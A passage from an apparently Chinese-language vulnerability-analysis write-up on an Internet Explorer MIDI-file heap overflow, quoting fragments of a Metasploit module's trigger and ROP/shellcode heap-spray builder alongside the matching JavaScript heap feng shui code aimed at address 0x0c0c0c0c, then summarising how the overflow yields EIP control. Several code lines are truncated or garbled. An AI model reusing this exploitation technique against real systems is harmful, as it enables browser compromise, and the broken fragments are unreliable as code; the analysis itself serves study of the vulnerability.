        # 5. Force the using of the confused tagVARIANT.
        def build_trigger(my_target, type="corruption")
          js_trigger = build_trigger_fn(my_target, type)
          select_element = build_element('selob', my_target, type)
          trigger =  true})
          return trigger
        end
上面msf中的代码对应书中的如下代码：
     var selob=document.createElement("select")
        selob.w0=
        selob.w1=unescape("%u0c0c %u0c0c")
        selob.w2=
        selob.w3=
        selob.w4=
        selob.w5=
        ...
        ...
        selob.w63=
        var clones=new Array(1000)
        function feng_shui(){
        var i=0
        while (i0){
        if (typeof(clones[k].w1)=="string"){
        }else{
        clone[k].w1('come on!')
        }
        k=k-2
        }
        feng_shui()
        document.audio.Play()
        }
上面的js中的函数trigger由下面的js调用执行(执行trigger函数在ie解析mid文件之后[也即在上面的  
document.audio.Play执行之后])：
在js构造的string变成object的属性时执行的函数的地址为0x0c0c0c0c是堆喷射的利用地址，对应msf中的构造堆喷射内存布局的代码如下：
    def build_spray(my_target, leak=0)
          # Extract string based on target
          if my_target.name == 'IE 8 on Windows XP SP3'
            js_extract_str = "var block = shellcode.substring(2, (0x40000-0x21)/2);"
          else
            js_extract_str = "var block = shellcode.substring(0, (0x80000-6)/2);"
          end
          # Build shellcode based on Rop requirement
          code = ''
          if my_target['Rop'] and datastore['MSHTML'].to_s != ''
            print_status("Generating ROP using info-leak: 0x#{leak.to_s(16)}")
            code  true})
          return spray
        end
**0x03 小结**  
漏洞场景：
程序(iexplore.exe)解析特殊构造的文件(mid)时，在内存中可找到有内存分配动作(winmmAlloc)，分配的内存大小一定(0x400)，如果解析特殊文件(mid中音轨事件为打开音符)会使程序在分配到的内存地址范围之外(0x419>0x400)有改变大小动作(使0x419偏移处的值+1)。
利用方法：
可以通过与这里相同的js的构造特殊内存结构的方法来利用这个改变动作来控制eip。  
**参考文献**
* * *
林桠泉. 漏洞战争：软件漏洞分析精要[M]. 北京:电子工业出版社, 2016.